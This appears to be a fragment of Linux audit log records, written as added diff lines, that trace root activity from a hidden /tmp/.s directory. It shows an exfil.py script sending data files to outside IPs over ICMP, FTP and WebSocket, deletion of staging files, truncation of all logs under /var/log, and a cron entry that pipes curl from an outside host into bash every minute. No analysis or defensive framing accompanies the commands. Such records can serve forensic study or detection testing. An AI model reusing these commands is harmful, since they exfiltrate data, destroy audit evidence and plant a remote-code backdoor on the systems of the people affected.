+type=SYSCALL msg=audit(1790070215.000:41): arch=c000003e syscall=59 success=yes exit=0 a0=7f1234ab0029 a1=7f1234ab002a a2=0 a3=0 items=2 ppid=19233 pid=19275 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="python3" exe="/usr/bin/python3" key="exec"
+type=EXECVE msg=audit(1790070215.000:41): argc=5 a0="python3" a1="/tmp/.s/exfil.py" a2="icmp" a3="/tmp/.s/p4.dat" a4="221.162.63.50"
+type=CWD msg=audit(1790070215.000:41): cwd="/tmp/.s"
+type=PATH msg=audit(1790070215.000:41): item=0 name="/usr/bin/python3" inode=40041 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 objtype=NORMAL
+type=SYSCALL msg=audit(1790070295.000:42): arch=c000003e syscall=59 success=yes exit=0 a0=7f1234ab002a a1=7f1234ab002b a2=0 a3=0 items=2 ppid=19233 pid=19276 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="python3" exe="/usr/bin/python3" key="exec"
+type=EXECVE msg=audit(1790070295.000:42): argc=7 a0="python3" a1="/tmp/.s/exfil.py" a2="ftp" a3="/tmp/.s/p5.dat" a4="198.244.146.163" a5="svc_backup" a6="daily_metrics.dat"
+type=CWD msg=audit(1790070295.000:42): cwd="/tmp/.s"
+type=PATH msg=audit(1790070295.000:42): item=0 name="/usr/bin/python3" inode=40042 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 objtype=NORMAL
+type=SYSCALL msg=audit(1790070415.000:43): arch=c000003e syscall=59 success=yes exit=0 a0=7f1234ab002b a1=7f1234ab002c a2=0 a3=0 items=2 ppid=19233 pid=19277 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="python3" exe="/usr/bin/python3" key="exec"
+type=EXECVE msg=audit(1790070415.000:43): argc=7 a0="python3" a1="/tmp/.s/exfil.py" a2="ws" a3="/tmp/.s/p6.dat" a4="66.132.172.130" a5="8080" a6="/ws/metrics"
+type=CWD msg=audit(1790070415.000:43): cwd="/tmp/.s"
+type=PATH msg=audit(1790070415.000:43): item=0 name="/usr/bin/python3" inode=40043 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 objtype=NORMAL
+type=SYSCALL msg=audit(1790070525.000:44): arch=c000003e syscall=59 success=yes exit=0 a0=7f1234ab002c a1=7f1234ab002d a2=0 a3=0 items=2 ppid=19233 pid=19278 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="rm" exe="/usr/bin/rm" key="exec"
+type=EXECVE msg=audit(1790070525.000:44): argc=6 a0="rm" a1="-f" a2="/tmp/.s/p5_raw.gz" a3="/tmp/.s/r.enc" a4="/tmp/.s/p1.dat" a5="/tmp/.s/p4.dat"
+type=CWD msg=audit(1790070525.000:44): cwd="/tmp/.s"
+type=PATH msg=audit(1790070525.000:44): item=0 name="/usr/bin/rm" inode=40044 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 objtype=NORMAL
+type=SYSCALL msg=audit(1790070530.000:45): arch=c000003e syscall=59 success=yes exit=0 a0=7f1234ab002d a1=7f1234ab002e a2=0 a3=0 items=2 ppid=19233 pid=19279 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="find" exe="/usr/bin/find" key="exec"
+type=EXECVE msg=audit(1790070530.000:45): argc=10 a0="find" a1="/var/log" a2="-name" a3="*.log" a4="-exec" a5="truncate" a6="-s" a7="0" a8="{}" a9="+"
+type=CWD msg=audit(1790070530.000:45): cwd="/tmp/.s"
+type=PATH msg=audit(1790070530.000:45): item=0 name="/usr/bin/find" inode=40045 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 objtype=NORMAL
+type=SYSCALL msg=audit(1790070725.000:46): arch=c000003e syscall=59 success=yes exit=0 a0=7f1234ab002e a1=7f1234ab002f a2=0 a3=0 items=2 ppid=19233 pid=19280 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="sh" exe="/usr/bin/sh" key="exec"
+type=EXECVE msg=audit(1790070725.000:46): argc=3 a0="sh" a1="-c" a2="echo '* * * * * root /usr/bin/curl -s http://198.244.146.163/api/ping 2>/dev/null | /bin/bash' > /etc/cron.d/sys-health-check"
+type=CWD msg=audit(1790070725.000:46): cwd="/tmp/.s"
+type=PATH msg=audit(1790070725.000:46): item=0 name="/usr/bin/sh" inode=40046 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 objtype=NORMAL
+type=SYSCALL msg=audit(1790070728.000:47): arch=c000003e syscall=59 success=yes exit=0 a0=7f1234ab002f a1=7f1234ab0030 a2=0 a3=0 items=2 ppid=19233 pid=19281 auid=4294967295 uid=0 gid=0 euid=0 suid=0 fsuid=0 egid=0 sgid=0 fsgid=0 tty=(none) ses=4294967295 comm="chmod" exe="/usr/bin/chmod" key="exec"
+type=EXECVE msg=audit(1790070728.000:47): argc=3 a0="chmod" a1="644" a2="/etc/cron.d/sys-health-check"
+type=CWD msg=audit(1790070728.000:47): cwd="/tmp/.s"
+type=PATH msg=audit(1790070728.000:47): item=0 name="/usr/bin/chmod" inode=40047 dev=fd:00 mode=0100755 ouid=0 ogid=0 rdev=00:00 objtype=NORMAL
